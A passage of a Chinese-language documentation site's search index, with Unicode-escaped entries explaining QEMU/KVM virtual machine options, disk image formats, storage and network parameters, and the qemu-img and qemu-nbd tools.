<p>\u200b\u8fd9\u4e2a\u200b\u547d\u4ee4\u200b\u7684\u200b\u5404\u4e2a\u200b\u53c2\u6570\u200b\u610f\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> <ul> <li><code>qemu-system-x86_64</code>: QEMU \u200b\u7684\u200b\u4e8c\u8fdb\u5236\u200b\u6587\u4ef6\u540d\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u8868\u793a\u200b\u8fd0\u884c\u200b x86_64 \u200b\u67b6\u6784\u200b\u7684\u200b\u7cfb\u7edf\u200b\u7ea7\u200b\u6a21\u62df\u5668\u200b\u3002</li> <li><code>-enable-kvm</code>: \u200b\u542f\u7528\u200b KVM\u3002</li> <li><code>-m 1024</code>: \u200b\u5206\u914d\u200b 1024MB \u200b\u5185\u5b58\u200b\u3002</li> <li><code>-cpu host</code>: \u200b\u4f7f\u7528\u200b\u5bbf\u4e3b\u673a\u200b CPU \u200b\u6a21\u578b\u200b\u3002</li> <li><code>-smp cores=2</code>: \u200b\u4f7f\u7528\u200b 2 \u200b\u4e2a\u200b CPU \u200b\u6838\u5fc3\u200b\u3002</li> <li><code>-drive file=example.img,format=raw,if=virtio</code>: \u200b\u4f7f\u7528\u200b <code>example.img</code> \u200b\u4f5c\u4e3a\u200b\u78c1\u76d8\u955c\u50cf\u200b\uff0c\u200b\u683c\u5f0f\u200b\u4e3a\u200b <code>raw</code>\uff0c\u200b\u4f7f\u7528\u200b <code>virtio</code> \u200b\u8bbe\u5907\u200b\u6a21\u578b\u200b\u3002</li> <li><code>-nic user,model=virtio</code>: \u200b\u4f7f\u7528\u200b\u7528\u6237\u200b\u6001\u200b\u7f51\u7edc\u8bbe\u5907\u200b\uff0c\u200b\u4f7f\u7528\u200b <code>virtio</code> \u200b\u8bbe\u5907\u200b\u6a21\u578b\u200b\u3002</li> </ul> <p>\u200b\u8fd9\u200b\u53ea\u662f\u200b\u521b\u5efa\u200b\u865a\u62df\u673a\u200b\u7684\u200b\u4e00\u4e2a\u200b\u57fa\u672c\u200b\u793a\u4f8b\u200b\uff0cQEMU \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5f88\u591a\u200b\u5176\u4ed6\u200b\u9009\u9879\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba9\u200b\u60a8\u200b\u5b9a\u5236\u200b\u7f51\u7edc\u200b\u3001\u200b\u56fe\u5f62\u200b\u8f93\u51fa\u200b\u3001\u200b\u8bbe\u5907\u200b\u7b49\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#_4","title":"\u8be6\u7ec6\u200b\u914d\u7f6e","text":""},{"location":"ops/virtualization/qemu-kvm/#_5","title":"\u5757\u200b\u5b58\u50a8","text":""},{"location":"ops/virtualization/qemu-kvm/#_6","title":"\u5b58\u50a8\u200b\u683c\u5f0f","text":"<p>QEMU \u200b\u652f\u6301\u200b\u591a\u79cd\u200b\u5b58\u50a8\u200b\u683c\u5f0f\u200b\uff0c\u200b\u6bcf\u79cd\u200b\u683c\u5f0f\u200b\u90fd\u200b\u6709\u200b\u5176\u200b\u7279\u5b9a\u200b\u7684\u200b\u4f18\u70b9\u200b\u548c\u200b\u7528\u9014\u200b\u3002\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e9b\u200b\u6700\u200b\u5e38\u89c1\u200b\u7684\u200b QEMU \u200b\u78c1\u76d8\u955c\u50cf\u200b\u683c\u5f0f\u200b\uff1a</p> <ol> <li>raw: \u200b\u8fd9\u200b\u662f\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b\u78c1\u76d8\u955c\u50cf\u200b\u683c\u5f0f\u200b\u3002\u200b\u5b83\u200b\u662f\u200b\u672a\u200b\u7ecf\u8fc7\u200b\u4efb\u4f55\u200b\u5904\u7406\u200b\u7684\u200b\u78c1\u76d8\u955c\u50cf\u200b\uff0c\u200b\u6ca1\u6709\u200b\u4efb\u4f55\u200b\u5143\u200b\u6570\u636e\u200b\u6216\u200b\u9644\u52a0\u200b\u7279\u6027\u200b\u3002\u200b\u56e0\u4e3a\u200b\u5176\u200b\u7b80\u5355\u200b\u6027\u200b\uff0c\u200b\u5b83\u200b\u901a\u5e38\u200b\u6709\u200b\u6700\u597d\u200b\u7684\u200b\u6027\u80fd\u200b\uff0c\u200b\u5e76\u4e14\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u88ab\u200b\u8bb8\u591a\u200b\u5176\u4ed6\u200b\u5de5\u5177\u200b\u8bfb\u53d6\u200b\uff0c\u200b\u6bd4\u5982\u200b dd\u3002\u200b\u5982\u679c\u200b\u4e3b\u673a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u652f\u6301\u200b\u7a00\u758f\u200b\u6587\u4ef6\u200b\uff0c\u200b\u90a3\u4e48\u200b raw \u200b\u683c\u5f0f\u200b\u7684\u200b\u78c1\u76d8\u955c\u50cf\u200b\u6587\u4ef6\u200b\u53ef\u4ee5\u200b\u975e\u5e38\u200b\u5c0f\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u5b83\u200b\u53ea\u4f1a\u200b\u5728\u200b\u9700\u8981\u200b\u65f6\u624d\u200b\u589e\u957f\u200b\u5230\u200b\u6240\u200b\u9700\u200b\u5927\u5c0f\u200b\u3002\u200b\u5982\u679c\u200b\u4e3b\u673a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u652f\u6301\u200b hole-punching \u200b\u64cd\u4f5c\u200b\uff0c\u200b\u90a3\u4e48\u200b raw \u200b\u683c\u5f0f\u200b\u7684\u200b\u78c1\u76d8\u955c\u50cf\u200b\u6587\u4ef6\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u91ca\u653e\u200b\u672a\u200b\u4f7f\u7528\u200b\u7684\u200b\u7a7a\u95f4\u200b\u3002</li> <li>qcow2 (QEMU Copy-On-Write version 2): \u200b\u8fd9\u662f\u200b QEMU \u200b\u6700\u200b\u5e38\u7528\u200b\u7684\u200b\u78c1\u76d8\u955c\u50cf\u200b\u683c\u5f0f\u200b\u3002\u200b\u5b83\u200b\u652f\u6301\u200b\u8bb8\u591a\u200b\u9ad8\u7ea7\u200b\u7279\u6027\u200b\uff0c\u200b\u5982\u5199\u200b\u65f6\u200b\u590d\u5236\u200b (copy-on-write)\uff0c\u200b\u5feb\u7167\u200b\uff0c\u200b\u538b\u7f29\u200b\uff0c\u200b\u52a0\u5bc6\u200b\u548c\u200b\u589e\u91cf\u200b\u5907\u4efd\u200b\u3002</li> </ol> <p>\u200b\u6b64\u5916\u200b QEMU \u200b\u8fd8\u200b\u652f\u6301\u200b\u8bb8\u591a\u200b\u5176\u4ed6\u200b\u78c1\u76d8\u683c\u5f0f\u200b\uff0c\u200b\u5982\u200b vmdk, vdi, vhdx \u200b\u7b49\u200b\u3002\u200b\u7531\u4e8e\u200b\u8fd9\u4e9b\u200b\u683c\u5f0f\u200b\u4e0d\u662f\u200b\u5f88\u200b\u5e38\u89c1\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4e0d\u518d\u200b\u8be6\u7ec6\u200b\u4ecb\u7ecd\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#_7","title":"\u914d\u7f6e\u200b\u53c2\u6570","text":"<p>QEMU \u200b\u4e2d\u200b\u5b58\u50a8\u200b\u5206\u4e3a\u200b\u5b58\u50a8\u200b\u540e\u7aef\u200b\u548c\u200b\u5b58\u50a8\u8bbe\u5907\u200b\u4e24\u4e2a\u200b\u90e8\u5206\u200b\uff0c\u200b\u5206\u522b\u200b\u4f7f\u7528\u200b <code>-blockdev</code> \u200b\u548c\u200b <code>-device</code> \u200b\u53c2\u6570\u200b\u8fdb\u884c\u200b\u914d\u7f6e\u200b\u3002</p> <p><code>-blockdev</code> \u200b\u53c2\u6570\u200b\u7528\u4e8e\u200b\u914d\u7f6e\u200b\u5b58\u50a8\u200b\u540e\u200b\u7aef\u200b\uff0c\u200b\u5e38\u7528\u200b\u7684\u200b\u914d\u7f6e\u200b\u8bed\u6cd5\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>-blockdev driver=&lt;file|raw|qcow2&gt;,node-name=&lt;name&gt;,file=&lt;path&gt;,&lt;other opts&gt;\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>raw</code> \u200b\u548c\u200b <code>qcow2</code> driver \u200b\u901a\u5e38\u200b\u5c42\u53e0\u200b\u5728\u200b <code>file</code> \u200b\u540e\u7aef\u200b\u4e0a\u200b\u4f7f\u7528\u200b\u3002<code>node-name</code> \u200b\u53c2\u6570\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u8be5\u540e\u200b\u7aef\u7684\u200b\u540d\u79f0\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u4e8e\u200b\u540e\u9762\u200b\u5f15\u7528\u200b\u3002</p> <p><code>-device</code> \u200b\u53c2\u6570\u200b\u7528\u4e8e\u200b\u914d\u7f6e\u200b\u8bbe\u5907\u200b\uff0c\u200b\u5e38\u7528\u200b\u7684\u200b\u914d\u7f6e\u200b\u8bed\u6cd5\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>-device virtio-blk-pci,drive=&lt;blockdev node name&gt;,&lt;other opts&gt;\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>virtio-blk-pci</code> \u200b\u662f\u200b\u8bbe\u5907\u200b\u6a21\u578b\u200b\uff0c<code>drive</code> \u200b\u53c2\u6570\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u8be5\u200b\u8bbe\u5907\u200b\u7684\u200b\u540e\u200b\u7aef\u200b\u3002\u200b\u9664\u4e86\u200b <code>virtio-blk-pci</code>\uff0cQEMU \u200b\u8fd8\u200b\u652f\u6301\u200b\u5176\u4ed6\u200b\u8bbe\u5907\u200b\u6a21\u578b\u200b\uff0c\u200b\u5982\u200b <code>ide</code>\uff0c<code>scsi</code> \u200b\u7b49\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0cQEMU \u200b\u8fd8\u200b\u652f\u6301\u200b <code>-drive</code> \u200b\u53c2\u6570\u200b\u7528\u4e8e\u200b\u540c\u65f6\u200b\u914d\u7f6e\u200b\u5b58\u50a8\u200b\u540e\u7aef\u200b\u548c\u200b\u8bbe\u5907\u200b\uff0c\u200b\u5176\u5b9e\u200b\u4f8b\u5982\u200b\u4e0b\u200b\uff1a</p> <pre><code>-drive file=example.img,format=raw,if=virtio\n</code></pre> <p>\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\u66f4\u52a0\u200b\u7b80\u6d01\u200b\uff0c\u200b\u4f46\u200b\u4e0d\u5982\u200b <code>-blockdev</code> \u200b\u548c\u200b <code>-device</code> \u200b\u53c2\u6570\u200b\u7075\u6d3b\u200b\u3002\u200b\u5f53\u200b <code>if</code> \u200b\u9009\u9879\u200b\u503c\u4e3a\u200b <code>none</code> \u200b\u65f6\u200b\uff0c<code>-drive</code> \u200b\u9009\u9879\u200b\u4ec5\u200b\u521b\u5efa\u200b\u540e\u200b\u7aef\u200b\uff0c\u200b\u4e0d\u200b\u521b\u5efa\u200b\u8bbe\u5907\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#_8","title":"\u7f51\u7edc","text":"<p>QEMU \u200b\u652f\u6301\u200b\u591a\u79cd\u200b\u7f51\u7edc\u200b\u540e\u200b\u7aef\u200b\uff0c\u200b\u5305\u62ec\u200b <code>user</code>\uff0c<code>tap</code>\uff0c<code>bridge</code> \u200b\u7b49\u200b\u3002\u200b\u5176\u4e2d\u200b <code>user</code> \u200b\u662f\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b\u7f51\u7edc\u200b\u540e\u200b\u7aef\u200b\uff0c\u200b\u5b83\u200b\u4f7f\u7528\u200b\u5bbf\u4e3b\u673a\u200b\u7684\u200b NAT \u200b\u7f51\u7edc\u200b\u8fdb\u884c\u200b\u7f51\u7edc\u8fde\u63a5\u200b\u3002<code>tap</code> \u200b\u5219\u200b\u662f\u200b\u6700\u200b\u5e38\u7528\u200b\u7684\u200b\u7f51\u7edc\u200b\u540e\u200b\u7aef\u200b\uff0c\u200b\u5b83\u200b\u4f7f\u7528\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u7684\u200b TAP \u200b\u8bbe\u5907\u200b\u8fdb\u884c\u200b\u7f51\u7edc\u8fde\u63a5\u200b\u3002<code>bridge</code> \u200b\u4e0e\u200b <code>tap</code> \u200b\u6ca1\u6709\u200b\u672c\u8d28\u533a\u522b\u200b\uff0c\u200b\u5b83\u200b\u53ea\u662f\u200b\u81ea\u52a8\u200b\u5c06\u200b\u521b\u5efa\u200b\u7684\u200b tap \u200b\u63a5\u53e3\u200b\u63a5\u5230\u200b\u7f51\u6865\u200b\u4e0a\u200b\u3002</p> <p><code>-nic</code> \u200b\u53c2\u6570\u200b\u540c\u65f6\u200b\u914d\u7f6e\u200b\u7f51\u7edc\u200b\u540e\u7aef\u200b\u548c\u200b\u8bbe\u5907\u200b\uff0c\u200b\u5e38\u7528\u200b\u7684\u200b\u914d\u7f6e\u200b\u8bed\u6cd5\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>-nic [tap|bridge|user|l2tpv3|vde|netmap|af-xdp|vhost-user|socket][,...][,mac=macaddr][,model=mn]\n</code></pre> <p>QEMU \u200b\u652f\u6301\u200b\u591a\u79cd\u200b\u7f51\u7edc\u8bbe\u5907\u200b\u6a21\u578b\u200b\uff0c\u200b\u5305\u62ec\u200b <code>virtio</code>\uff0c<code>e1000</code>\uff0c<code>rtl8139</code> \u200b\u7b49\u200b\u3002\u200b\u5176\u4e2d\u200b <code>virtio</code> \u200b\u662f\u200b\u6027\u80fd\u200b\u6700\u597d\u200b\u7684\u200b\u8bbe\u5907\u200b\u6a21\u578b\u200b\uff0c\u200b\u4e14\u200b\u73b0\u5728\u200b\u51e0\u4e4e\u200b\u6240\u6709\u200b Linux \u200b\u53d1\u884c\u7248\u200b\u5747\u200b\u5305\u542b\u200b\u4e86\u200b\u5bf9\u5e94\u200b\u9a71\u52a8\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5927\u591a\u6570\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u76f4\u63a5\u200b\u4f7f\u7528\u200b\u8be5\u200b\u6a21\u578b\u200b\u5373\u53ef\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#_9","title":"\u5185\u5b58","text":"<p>\u200b\u672c\u200b\u8282\u200b\u5185\u5bb9\u200b\u5f85\u200b\u8865\u5145\u200b</p>"},{"location":"ops/virtualization/qemu-kvm/#cpu","title":"CPU","text":"<p>\u200b\u672c\u200b\u8282\u200b\u5185\u5bb9\u200b\u5f85\u200b\u8865\u5145\u200b</p>"},{"location":"ops/virtualization/qemu-kvm/#_10","title":"\u5b9e\u7528\u5de5\u5177","text":""},{"location":"ops/virtualization/qemu-kvm/#qemu-img","title":"qemu-img","text":"<p><code>qemu-img</code> \u200b\u662f\u200b QEMU \u200b\u63d0\u4f9b\u200b\u7684\u200b\u4e00\u4e2a\u200b\u7528\u4e8e\u200b\u521b\u5efa\u200b\u3001\u200b\u8f6c\u6362\u200b\u548c\u200b\u64cd\u4f5c\u200b\u78c1\u76d8\u955c\u50cf\u200b\u7684\u200b\u5de5\u5177\u200b\u3002\u200b\u5b83\u200b\u652f\u6301\u200b\u591a\u79cd\u200b\u78c1\u76d8\u683c\u5f0f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u65b9\u4fbf\u200b\u5730\u200b\u8fdb\u884c\u200b\u78c1\u76d8\u955c\u50cf\u200b\u7684\u200b\u521b\u5efa\u200b\u3001\u200b\u8f6c\u6362\u200b\u3001\u200b\u6269\u5bb9\u200b\u7b49\u200b\u64cd\u4f5c\u200b\u3002</p> <p><code>qemu-img</code> \u200b\u7684\u200b\u8be6\u7ec6\u200b\u7528\u6cd5\u200b\u548c\u200b\u9009\u9879\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>man qemu-img</code> \u200b\u6216\u200b <code>qemu-img --help</code> \u200b\u67e5\u770b\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#_11","title":"\u521b\u5efa","text":"<p><code>qemu-img create</code> \u200b\u547d\u4ee4\u200b\u7528\u4e8e\u200b\u521b\u5efa\u200b\u78c1\u76d8\u955c\u50cf\u200b\uff0c\u200b\u57fa\u672c\u200b\u7528\u6cd5\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>qemu-img create -f &lt;FORMAT:raw|qcow2|...&gt; -o &lt;OPTIONS&gt; &lt;IMAGE&gt; &lt;SIZE&gt;\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>-f</code> \u200b\u9009\u9879\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u78c1\u76d8\u955c\u50cf\u200b\u683c\u5f0f\u200b\uff0c<code>-o</code> \u200b\u9009\u9879\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u683c\u5f0f\u200b\u76f8\u5173\u200b\u7684\u200b\u9009\u9879\u200b\uff0c<code>&lt;IMAGE&gt;</code> \u200b\u4e3a\u200b\u78c1\u76d8\u955c\u50cf\u200b\u6587\u4ef6\u540d\u200b\uff0c<code>&lt;SIZE&gt;</code> \u200b\u4e3a\u200b\u78c1\u76d8\u955c\u50cf\u200b\u5927\u5c0f\u200b\u3002</p> <p>Tip</p> <p>\u200b\u521b\u5efa\u200b <code>qcow2</code> \u200b\u683c\u5f0f\u200b\u7684\u200b\u78c1\u76d8\u955c\u50cf\u200b\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>-o preallocation=metadata</code> \u200b\u9009\u9879\u200b\u6307\u5b9a\u200b\u9884\u200b\u5206\u914d\u200b\u5143\u200b\u6570\u636e\u200b\uff0c\u200b\u4ee5\u200b\u63d0\u9ad8\u200b\u6027\u80fd\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#_12","title":"\u8f6c\u6362","text":"<p><code>qemu-img convert</code> \u200b\u547d\u4ee4\u200b\u7528\u4e8e\u200b\u8f6c\u6362\u200b\u78c1\u76d8\u955c\u50cf\u200b\u683c\u5f0f\u200b\uff0c\u200b\u57fa\u672c\u200b\u7528\u6cd5\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>qemu-img convert -f &lt;SRC_FORMAT:raw|qcow2|...&gt; -O &lt;DST_FORMAT:raw|qcow2|...&gt; -o &lt;OPTIONS&gt; &lt;SRC_IMAGE&gt; &lt;DST_IMAGE&gt;\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>-f</code> \u200b\u9009\u9879\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u6e90\u200b\u78c1\u76d8\u955c\u50cf\u200b\u683c\u5f0f\u200b\uff0c<code>-O</code> \u200b\u9009\u9879\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u76ee\u6807\u200b\u78c1\u76d8\u955c\u50cf\u200b\u683c\u5f0f\u200b\uff0c<code>-o</code> \u200b\u9009\u9879\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u683c\u5f0f\u200b\u76f8\u5173\u200b\u7684\u200b\u9009\u9879\u200b\uff0c<code>&lt;SRC_IMAGE&gt;</code> \u200b\u4e3a\u6e90\u200b\u78c1\u76d8\u955c\u50cf\u200b\u6587\u4ef6\u540d\u200b\uff0c<code>&lt;DST_IMAGE&gt;</code> \u200b\u4e3a\u200b\u76ee\u6807\u200b\u78c1\u76d8\u955c\u50cf\u200b\u6587\u4ef6\u540d\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#_13","title":"\u6269\u7f29\u5bb9","text":"<p><code>qemu-img resize</code> \u200b\u547d\u4ee4\u200b\u7528\u4e8e\u200b\u6269\u7f29\u5bb9\u200b\u78c1\u76d8\u955c\u50cf\u200b\uff0c\u200b\u57fa\u672c\u200b\u7528\u6cd5\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>qemu-img resize -f &lt;FORMAT&gt; [--shrink] &lt;IMAGE&gt; [+|-]&lt;SIZE&gt;\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>-f</code> \u200b\u9009\u9879\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u78c1\u76d8\u955c\u50cf\u200b\u683c\u5f0f\u200b\uff0c<code>--shrink</code> \u200b\u9009\u9879\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u662f\u5426\u200b\u6536\u7f29\u200b\u78c1\u76d8\u955c\u50cf\u200b\uff0c<code>&lt;IMAGE&gt;</code> \u200b\u4e3a\u200b\u78c1\u76d8\u955c\u50cf\u200b\u6587\u4ef6\u540d\u200b\uff0c<code>&lt;SIZE&gt;</code> \u200b\u4e3a\u200b\u78c1\u76d8\u955c\u50cf\u200b\u5927\u5c0f\u200b\u3002</p> <p>\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u7f29\u5c0f\u200b\u955c\u50cf\u200b\u65f6\u200b\uff0c\u200b\u8d85\u8fc7\u200b\u6307\u5b9a\u200b\u5927\u5c0f\u200b\u7684\u200b\u6570\u636e\u200b\u5c06\u200b\u88ab\u200b\u622a\u65ad\u200b\u4e22\u5f03\u200b\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u5728\u200b\u955c\u50cf\u200b\u5185\u90e8\u200b\u5148\u200b\u8fdb\u884c\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5bb9\u91cf\u200b\u8c03\u6574\u200b\u548c\u200b\u5206\u533a\u8868\u200b\u8c03\u6574\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5e76\u200b\u9700\u8981\u200b\u5c0f\u5fc3\u200b\u8ba1\u7b97\u200b\u5404\u200b\u5206\u533a\u200b\u504f\u79fb\u91cf\u200b\u548c\u200b\u76ee\u6807\u200b\u955c\u50cf\u200b\u5927\u5c0f\u200b\u3002</p> <p>Tip</p> <p>\u200b\u7f29\u5bb9\u65f6\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5148\u200b\u5c06\u200b\u5185\u90e8\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u8c03\u6574\u200b\u81f3\u200b\u6700\u5c0f\u200b\u5927\u5c0f\u200b\uff0c\u200b\u7136\u540e\u200b\u8c03\u6574\u200b\u5206\u533a\u200b\u5927\u5c0f\u200b\u81f3\u200b\u76ee\u6807\u200b\u5927\u5c0f\u200b\uff0c\u200b\u63a5\u7740\u200b\u8c03\u6574\u200b\u955c\u50cf\u200b\u5927\u5c0f\u200b\uff0c\u200b\u6700\u540e\u200b\u518d\u200b\u5c06\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u6269\u5bb9\u200b\u81f3\u200b\u6700\u5927\u200b\u3002\u200b\u5728\u200b\u6b64\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u4e5f\u200b\u9700\u8981\u200b\u5c0f\u5fc3\u200b\u8ba1\u7b97\u200b\u6d89\u53ca\u200b\u5230\u200b\u7684\u200b\u5404\u79cd\u200b\u5927\u5c0f\u200b\u548c\u200b\u504f\u79fb\u91cf\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#qemu-nbd","title":"qemu-nbd","text":"<p><code>qemu-nbd</code> \u200b\u662f\u200b QEMU \u200b\u63d0\u4f9b\u200b\u7684\u200b\u4e00\u4e2a\u200b\u7528\u4e8e\u200b\u6302\u8f7d\u200b\u78c1\u76d8\u955c\u50cf\u200b\u7684\u200b\u5de5\u5177\u200b\u3002\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u78c1\u76d8\u955c\u50cf\u200b\u6587\u4ef6\u200b\u6620\u5c04\u200b\u4e3a\u200b\u4e00\u4e2a\u200b\u5757\u200b\u8bbe\u5907\u200b\uff0c\u200b\u7136\u540e\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>mount</code> \u200b\u547d\u4ee4\u200b\u5c06\u200b\u5176\u200b\u6302\u8f7d\u200b\u5230\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\uff0c\u200b\u6216\u8005\u200b\u5bf9\u200b\u8be5\u200b\u5757\u200b\u8bbe\u5907\u200b\u8fdb\u884c\u200b\u5176\u4ed6\u200b\u64cd\u4f5c\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b\u524d\u200b\u9700\u8981\u200b\u5148\u200b\u52a0\u8f7d\u200b <code>nbd</code> \u200b\u5185\u6838\u6a21\u5757\u200b\uff1a</p> <pre><code>modprobe nbd\n</code></pre> <p>\u200b\u5751\u200b</p> <p><code>nbd</code> \u200b\u9ed8\u8ba4\u200b\u521b\u5efa\u200b\u5f88\u591a\u200b nbd \u200b\u8bbe\u5907\u200b\uff0c\u200b\u5360\u636e\u200b\u5927\u91cf\u200b\u8bbe\u5907\u200b\u53f7\u200b\uff0c\u200b\u5982\u679c\u200b\u4e3b\u673a\u200b\u4e0a\u200b\u672c\u6765\u200b\u5c31\u200b\u5df2\u7ecf\u200b\u6709\u200b\u5f88\u591a\u200b\u8bbe\u5907\u200b\uff0c\u200b\u5728\u200b\u52a0\u8f7d\u200b <code>nbd</code> \u200b\u6a21\u5757\u200b\u7684\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u53ef\u80fd\u200b\u56e0\u200b\u8bbe\u5907\u200b\u53f7\u200b\u5206\u914d\u200b\u5931\u8d25\u200b\u800c\u200b\u51fa\u9519\u200b\uff0c\u200b\u5728\u200b\u5185\u6838\u200b\u65e5\u5fd7\u200b\u4e2d\u200b\u7559\u4e0b\u200b\u4e00\u4e2a\u200b oops\u3002\u200b\u8fd9\u79cd\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>nbds_max</code> \u200b\u53c2\u6570\u200b\u9650\u5236\u200b <code>nbd</code> \u200b\u8bbe\u5907\u200b\u7684\u200b\u6570\u91cf\u200b\u3002</p> <pre><code>modprobe nbd nbds_max=2\n</code></pre> <p>\u200b\u7136\u540e\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>qemu-nbd</code> \u200b\u547d\u4ee4\u200b\u6302\u8f7d\u200b\u78c1\u76d8\u955c\u50cf\u200b\uff0c\u200b\u5e38\u7528\u547d\u4ee4\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>qemu-nbd -c /dev/nbdX -f &lt;FORMAT:raw|qcow2|...&gt; --discard=&lt;unmap|ignore&gt; &lt;IMAGE&gt;\n</code></pre> <p>\u200b\u5176\u4e2d\u200b <code>-c</code> \u200b\u9009\u9879\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b nbd \u200b\u8bbe\u5907\u200b\u53f7\u200b\uff0c<code>-f</code> \u200b\u9009\u9879\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u78c1\u76d8\u955c\u50cf\u200b\u683c\u5f0f\u200b\uff0c<code>--discard</code> \u200b\u9009\u9879\u200b\u7528\u4e8e\u200b\u6307\u5b9a\u200b\u78c1\u76d8\u955c\u50cf\u200b\u652f\u6301\u200b\u7684\u200b TRIM/DISCARD \u200b\u64cd\u4f5c\u200b\uff0c<code>&lt;IMAGE&gt;</code> \u200b\u4e3a\u200b\u78c1\u76d8\u955c\u50cf\u200b\u6587\u4ef6\u200b\u3002\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u53ea\u8bfb\u200b\u6302\u8f7d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b <code>-r</code> \u200b\u9009\u9879\u200b\u3002<code>qemu-nbd</code> \u200b\u7684\u200b\u5176\u4ed6\u200b\u7528\u6cd5\u200b\u548c\u200b\u9009\u9879\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>man qemu-nbd</code> \u200b\u6216\u200b <code>qemu-nbd --help</code> \u200b\u67e5\u770b\u200b\u3002</p>"},{"location":"ops/virtualization/qemu-kvm/#_14","title":"\u7ba1\u7406\u5de5\u5177","text":"<p>\u200b\u672c\u200b\u8282\u200b\u5185\u5bb9\u200b\u5f85\u200b\u8865\u5145\u200b</p> <p>QEMU \u200b\u76f4\u63a5\u200b\u8fd0\u884c\u200b\u53c2\u6570\u200b\u4f17\u591a\u200b\uff0c\u200b\u914d\u7f6e\u200b\u590d\u6742\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e00\u822c\u200b\u4e0d\u200b\u76f4\u63a5\u200b\u8fd0\u884c\u200b QEMU \u200b\u547d\u4ee4\u200b\uff0c\u200b\u800c\u662f\u200b\u4f7f\u7528\u200b\u4e00\u4e9b\u200b\u7ba1\u7406\u5de5\u5177\u200b\u6765\u200b\u521b\u5efa\u200b\u548c\u200b\u7ba1\u7406\u200b\u865a\u62df\u673a\u200b\uff0c\u200b\u5982\u200b libvirt\uff0cvirt-manager, Proxmox VE \u200b\u7b49\u200b\u3002</p>"},{"location":"spec/contributors/","title":"\u8d21\u732e\u8005","text":""},{"location":"spec/contributors/#team","title":"\u4e3b\u8981\u200b\u4f5c\u8005","text":"<p>\u200b\u8be6\u89c1\u200b\u6bcf\u9875\u200b\u5f00\u5934\u200b\u90e8\u5206\u200b\u3002</p>"},{"location":"spec/contributors/#github","title":"GitHub \u200b\u8d21\u732e\u8005","text":""},{"location":"spec/writing/","title":"\u7ae0\u8282\u200b\u7f16\u5199\u200b\u6307\u5bfc","text":"<p>\u200b\u672c\u200b\u90e8\u5206\u200b\u53c2\u8003\u200b\u81ea\u200b Linux 101 